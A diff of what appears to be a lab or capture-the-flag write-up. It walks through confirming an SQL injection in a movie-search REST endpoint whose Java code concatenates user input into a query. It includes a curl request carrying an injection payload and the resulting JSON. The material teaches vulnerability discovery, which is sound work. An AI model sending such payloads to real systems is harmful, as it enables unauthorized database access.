@@ -115,10 +115,10 @@ public List<MovieDto> findMovie(String title, String description, String genre, 
 We control the `title` variable/input. The `sql` string is concatinated so it is very likely that this code contains a SQL injection vulnerability. We already discovered that the `rest/movie` endpoint leads to this code (using a GET request). We can send a GET request to test the theory:
 
 ```
-curl "http://10.10.0.120:8080/rest/movie?title=Star%'--"
+curl "http://10.10.0.120:8080/rest/movie?title=Star%';--"
 ```
 
-Notice in the result we still get a valid response even after we have injected SQL syntax:
+Notice in the result we still get a valid response even after we have injected SQL syntax (`%';--`):
 
 ```
 [{"id":"1","title":"Star Wars - A new hope","description":"Luke Skywalker joins forces with a Jedi Knight, a cocky pilot, a Wookiee, and two droids to save the galaxy from the Empires world-destroying battle-station, while also attempting to rescue Princess Leia from the evil Darth Vader.","genre":" Action, Adventure, Fantasy"},{"id":"2","title":"Star Wars - The Empire Strikes Back","description":"After the rebels are overpowered by the Empire on their newly established base, Luke Skywalker begins Jedi training with Master Yoda. His friends accept shelter from a questionable ally as Darth Vader hunts them in a plan to capture Luke.","genre":" Action, Adventure, Fantasy"},{"id":"3","title":"Star Wars - Return of the Jedi","description":"After a daring mission to rescue Han Solo from Jabba the Hutt, the rebels dispatch to Endor to destroy a more powerful Death Star. Meanwhile, Luke struggles to help Vader back from the dark side without falling into the Emperors trap.","genre":" Action, Adventure, Fantasy"}]
